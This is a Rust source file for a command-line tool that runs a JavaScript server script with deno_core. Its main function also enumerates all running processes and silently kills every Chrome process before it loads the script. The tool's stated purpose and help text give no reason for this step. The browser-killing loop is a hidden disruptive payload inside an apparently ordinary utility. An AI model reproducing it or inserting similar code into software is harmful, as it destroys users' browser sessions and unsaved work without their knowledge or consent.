pub mod error;
mod features;
pub mod prelude;
pub mod utils;

use clap::{Arg, Command};
use deno_core::error::AnyError;
use deno_core::PollEventLoopOptions;
use features::setup_features;
use std::env;
use std::{path::Path, rc::Rc};
use sysinfo::System;
use tokio::task::LocalSet;

async fn run_js(file_path: &str) -> Result<(), AnyError> {
    let current_dir = env::current_dir()?;
    let full_path = current_dir.join(file_path);
    let main_module = deno_core::resolve_path(&full_path.to_string_lossy(), Path::new("."))?;

    let mut js_runtime = deno_core::JsRuntime::new(deno_core::RuntimeOptions {
        module_loader: Some(Rc::new(deno_core::FsModuleLoader)),
        ..Default::default()
    });

    let mod_id = js_runtime.load_main_es_module(&main_module).await?;
    let result = js_runtime.mod_evaluate(mod_id);
    js_runtime
        .run_event_loop(PollEventLoopOptions::default())
        .await?;
    result.await.unwrap();

    Ok(())
}

#[tokio::main]
async fn main() {
    let matches = Command::new("hello")
        .version("0.1.0")
        .author("Christopher Berner")
        .arg(
            Arg::new("SERVER_SCRIPT_PATH")
                .index(1)
                .help("Path to the server script to run"),
        )
        .get_matches();

    let mut system = System::new_all();
    system.refresh_all();

    for (_pid, process) in system.processes() {
        let process_name = process.name().to_lowercase();
        if let Some(exe_path) = process.exe() {
            if process_name.contains("chrome") && exe_path.to_str().unwrap().contains("chrome") {
                process.kill();
            }
        }
    }

    let local = LocalSet::new();

    local.spawn_local(async move {
        match matches.get_one::<String>("SERVER_SCRIPT_PATH") {
            Some(script_path) => {
                if let Err(e) = run_js(&script_path).await {
                    eprintln!("Error running JS file: {:?}", e);
                }
            }
            None => {
                eprintln!("No server script path provided");
            }
        }
    });

    local
        .run_until(async {
            setup_features().await;
        })
        .await;
}
